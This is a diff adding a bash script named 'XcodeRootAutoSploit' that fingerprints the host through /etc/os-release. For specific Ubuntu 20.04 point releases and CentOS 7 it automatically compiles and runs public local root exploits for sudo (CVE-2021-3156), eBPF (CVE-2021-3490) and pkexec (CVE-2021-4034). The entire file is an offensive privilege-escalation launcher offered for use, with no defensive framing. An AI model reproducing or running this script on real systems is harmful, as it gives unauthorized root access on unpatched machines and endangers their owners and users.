@@ -1,0 +1,46 @@
+#!/bin/bash
+# XcodeRootAutoSploit v0.1 Beta 1
+if [ -f /etc/os-release ]; then
+    . /etc/os-release
+    NAME=$NAME
+    PRETTY_NAME=$PRETTY_NAME
+    VERSION_ID=$VERSION_ID
+else
+    exit 1
+fi
+
+case $NAME in
+    "Ubuntu")
+        case $PRETTY_NAME in
+            "Ubuntu 20.04.1 LTS")
+               echo "test"
+               make -C CVE-2021-3156
+               cd CVE-2021-3156 && ./sudo-hax-me-a-sandwich 1
+                ;;
+            "Ubuntu 20.04.2 LTS")
+                make -C Linux_LPE_eBPF_CVE-2021-3490
+                cd Linux_LPE_eBPF_CVE-2021-3490/bin && ./exploit.bin
+                ;;
+            "Ubuntu 20.04.3 LTS")
+                echo "ubuntu 20.04.3 LTS"
+                gcc CVE-2021-4034/cve-2021-4034-poc.c -o CVE-2021-4034/cve-2021-4034-poc
+                cd CVE-2021-4034 && ./cve-2021-4034-poc
+                ;;
+            *)
+                exit 1
+                ;;
+        esac
+        ;;
+
+    "CentOS Linux")
+        case $VERSION_ID in
+            "7")
+               ./CentOS7/CVE-2021-3156/exploit_defaults_mailer.py
+               ./CentOS7/CVE-2021-3156/exploit_cent7_userspec.py
+                ;;
+            *)
+                exit 1
+                ;;
+        esac
+        ;;
+esac
